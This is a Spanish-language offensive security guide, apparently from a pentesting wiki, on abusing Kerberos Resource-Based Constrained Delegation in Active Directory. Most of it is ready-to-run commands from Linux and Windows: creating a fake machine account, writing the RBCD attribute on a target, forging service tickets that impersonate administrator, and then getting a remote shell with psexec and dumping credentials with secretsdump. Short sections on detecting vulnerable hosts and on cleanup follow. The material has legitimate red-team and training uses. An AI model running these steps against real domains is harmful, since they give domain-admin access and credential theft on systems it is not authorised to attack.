## Resource-Based Constrained Delegation (RBCD)

La delegación restringida basada en recursos (RBCD) es un mecanismo de Kerberos que permite a un servicio actuar en nombre de un usuario para acceder a recursos en otro equipo. A diferencia de la delegación constrained clásica (configurada en el objeto que delega), en RBCD la configuración reside en el **objeto destino** — concretamente en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Esto significa que si un usuario tiene permisos de escritura sobre ese atributo en un equipo objetivo, puede configurar qué cuentas pueden impersonar a cualquier usuario al acceder a ese equipo — incluyendo administradores de dominio.

### Prerrequisitos

| Requisito | Detalle |
| --------- | ------- |
| Escritura sobre el objetivo | `WriteProperty`, `GenericWrite` o `GenericAll` sobre el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del equipo objetivo |
| Crear cuentas de equipo | Por defecto cualquier usuario del dominio puede crear hasta 10 máquinas (`MachineAccountQuota`) |
| Acceso de red | LDAP (389/tcp) o LDAPS (636/tcp) + SAMR (445/tcp) + Kerberos (88/tcp) al DC |

---

## Desde Linux (externamente — recomendado)

### Paso 1 — Crear un equipo falso

```shell
addcomputer.py -computer-name 'evilcomputer$' -computer-pass 'ev1lP@sS' \
  -dc-ip <ip_dc> <dominio>/<usuario>:<contraseña>
```

El equipo falso actuará como el "servicio delegado" que impersonará a usuarios privilegiados.

### Paso 2 — Configurar RBCD en el equipo objetivo

Añadir el descriptor de seguridad del equipo falso al atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del equipo objetivo:

```shell
# Con rbcd.py (repo de tothi)
python3 rbcd.py -f EVILCOMPUTER -t <equipo_objetivo> \
  -dc-ip <ip_dc> <dominio>\\<usuario>:<contraseña>

# Alternativa con BloodyAD
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  set object <equipo_objetivo>$ msDS-AllowedToActOnBehalfOfOtherIdentity \
  -v 'evilcomputer$'
```

### Paso 3 — Solicitar un ticket de servicio impersonando a Administrator

```shell
getST.py -spn cifs/<equipo_objetivo>.<dominio> \
  -impersonate administrator \
  -dc-ip <ip_dc> \
  <dominio>/evilcomputer$:'ev1lP@sS'
```

Esto genera el archivo `administrator.ccache` con un ticket de servicio CIFS impersonando a Administrator.

### Paso 4 — Exportar el ticket y usarlo

```shell
export KRB5CCNAME=$(pwd)/administrator.ccache

# Verificar el ticket
klist

# Acceder al equipo objetivo como Administrator
psexec.py -k -no-pass <dominio>/administrator@<equipo_objetivo>.<dominio>
secretsdump.py -k -no-pass <dominio>/administrator@<equipo_objetivo>.<dominio>
```

---

## Desde Windows (internamente)

```powershell
# Cargar módulos necesarios
Import-Module .\Powermad.ps1
Import-Module .\PowerView.ps1

# Crear equipo falso
New-MachineAccount -MachineAccount evilcomputer -Password $(ConvertTo-SecureString 'ev1lP@sS' -AsPlainText -Force)

# Obtener el SID del equipo falso
$sid = Get-DomainComputer evilcomputer -Properties objectsid | Select -Expand objectsid

# Construir el descriptor de seguridad
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Configurar RBCD en el equipo objetivo
Get-DomainComputer <equipo_objetivo> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Solicitar ticket impersonando a Administrator con Rubeus
.\Rubeus.exe s4u /user:evilcomputer$ /rc4:<hash_nt_evilcomputer> \
  /impersonateuser:administrator \
  /msdsspn:cifs/<equipo_objetivo>.<dominio> /ptt
```

---

## Verificar si un equipo es vulnerable

```shell
# Desde Linux — comprobar quién puede escribir en el atributo RBCD
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  get object <equipo_objetivo>$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# Desde BloodHound — buscar el edge:
# "WriteDacl", "GenericWrite", "GenericAll" sobre objetos de tipo Computer
```

---

## Limpiar tras el ataque

```shell
# Eliminar la configuración RBCD del equipo objetivo
bloodyAD --host <ip_dc> -d <dominio> -u <usuario> -p <contraseña> \
  set object <equipo_objetivo>$ msDS-AllowedToActOnBehalfOfOtherIdentity -v ''

# Eliminar el equipo falso
addcomputer.py -computer-name 'evilcomputer$' -computer-pass 'ev1lP@sS' \
  -dc-ip <ip_dc> <dominio>/<usuario>:<contraseña> -delete
```

> 💡 RBCD es uno de los vectores más potentes cuando BloodHound muestra `GenericWrite` o `WriteProperty` sobre un equipo — especialmente si ese equipo es un Domain Controller, ya que permite obtener un ticket de servicio como Administrator sobre el DC y ejecutar DCSync a continuación.

---

### Referencias

- https://github.com/tothi/rbcd-attack
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
- https://bloodhound.specterops.io/resources/edges/allowed-to-act
